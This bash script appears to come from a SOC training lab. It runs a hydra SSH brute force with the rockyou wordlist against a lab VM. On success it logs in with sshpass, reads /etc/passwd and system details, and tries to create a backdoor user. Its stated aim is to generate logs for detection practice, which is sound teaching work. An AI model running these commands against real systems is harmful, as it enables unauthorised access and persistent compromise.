#!/bin/bash
# SSH Brute Force Simulation Script
# Run from Kali Linux attacker VM
# Target: Ubuntu victim VM

TARGET_IP="172.16.0.20"
TARGET_PORT="22"
USERNAME="john"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] SOC Lab - SSH Brute Force Simulation"
echo "[*] Target: $TARGET_IP:$TARGET_PORT"
echo "[*] This will generate auth.log entries for analysis"
echo ""

# Check if hydra is available
if ! command -v hydra &> /dev/null; then
    echo "[-] hydra not found. Install with: sudo apt install hydra"
    exit 1
fi

# Check connectivity
echo "[*] Testing connectivity to $TARGET_IP..."
if ! ping -c 1 -W 2 "$TARGET_IP" &> /dev/null; then
    echo "[-] Cannot reach $TARGET_IP. Check your network configuration."
    exit 1
fi
echo "[+] Target is reachable"

# Phase 1: Brute force with hydra (limited to first 100 lines of rockyou)
echo ""
echo "[*] Phase 1: Starting SSH brute force with hydra..."
echo "[*] Using first 500 passwords from rockyou.txt"

head -500 "$WORDLIST" > /tmp/short_wordlist.txt

hydra -l "$USERNAME" \
      -P /tmp/short_wordlist.txt \
      -t 4 \
      -s "$TARGET_PORT" \
      -o /tmp/hydra_results.txt \
      "$TARGET_IP" ssh

# Check if any credentials were found
if [ -f /tmp/hydra_results.txt ] && grep -q "login:" /tmp/hydra_results.txt; then
    echo ""
    echo "[+] Credentials found!"
    cat /tmp/hydra_results.txt | grep "login:"

    # Extract password from results
    FOUND_PASS=$(grep "login:" /tmp/hydra_results.txt | awk '{print $NF}')

    echo ""
    echo "[*] Phase 2: Post-exploitation with found credentials..."

    # Connect and run discovery commands
    sshpass -p "$FOUND_PASS" ssh -o StrictHostKeyChecking=no \
        "$USERNAME@$TARGET_IP" << 'ENDSSH'
echo "[ATTACKER] Logged in successfully"
echo "--- SYSTEM DISCOVERY ---"
id
whoami
uname -a
cat /etc/os-release | head -3
hostname
ip addr | grep inet
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/
echo ""
echo "--- CREATING BACKDOOR USER ---"
sudo adduser --disabled-password --gecos "" hacker99 2>/dev/null || echo "Need sudo for this step"
echo ""
echo "--- CHECKING SUDO RIGHTS ---"
sudo -l 2>/dev/null
ENDSSH

else
    echo ""
    echo "[*] No credentials found with short wordlist (expected in lab)"
    echo "[*] The brute force attempts are still logged in auth.log on the victim"
    echo "[*] Use the sample logs in logs/auth.log.sample for analysis"
fi

echo ""
echo "[*] Attack simulation complete."
echo "[*] Now check Kibana/Wazuh for alerts, or analyze logs/auth.log.sample"
echo "[*] See detection/kibana_queries.md for investigation queries"
